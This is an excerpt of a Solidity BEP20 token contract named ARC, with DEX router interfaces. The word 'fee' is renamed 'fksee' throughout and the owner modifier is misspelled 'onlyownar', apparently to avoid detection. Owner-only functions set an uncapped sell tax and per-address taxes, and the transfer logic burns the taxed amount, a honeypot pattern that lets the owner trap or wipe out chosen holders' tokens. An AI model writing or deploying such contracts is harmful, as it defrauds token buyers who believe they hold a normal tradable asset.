...
interface IUniswapV2Factory {
    ...
    function fkseeTo() external view returns (address);
    function fkseeToSetter() external view returns (address);
    ...
    function setfkseeTo(address) external;
    function setfkseeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfkseeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfkseeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfkseeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfkseeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfkseeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract ARC is BEP20, Ownable {
    ...
    uint256 private _defaultSellfksee = 0;

    uint256 private _defaultBuyfksee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfksee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfksee = _value;
    }

    function setSlipfksee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfksee[_address] = _value;
    }

    function getSlipfksee(address _address) external view onlyownar returns (uint256) {
        return _slipfksee[_address];
    }


    function setMAccountfksee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfksee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefkseeAmount = 0;

        if (rF) {
            uint256 tradefksee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefksee = _defaultSellfksee;
                }
                if (from == uniswapV2Pair) {

                    tradefksee = _defaultBuyfksee;
                }
            }
            if (_slipfksee[from] > 0) {
                tradefksee = _slipfksee[from];
            }

            tradefkseeAmount = _Amount.mul(tradefksee).div(100);
        }


        if (tradefkseeAmount > 0) {
            _balances[from] = _balances[from].sub(tradefkseeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefkseeAmount);
            emit Transfer(from, _deadAddress, tradefkseeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefkseeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefkseeAmount);
        emit Transfer(from, _to, _Amount - tradefkseeAmount);
    }
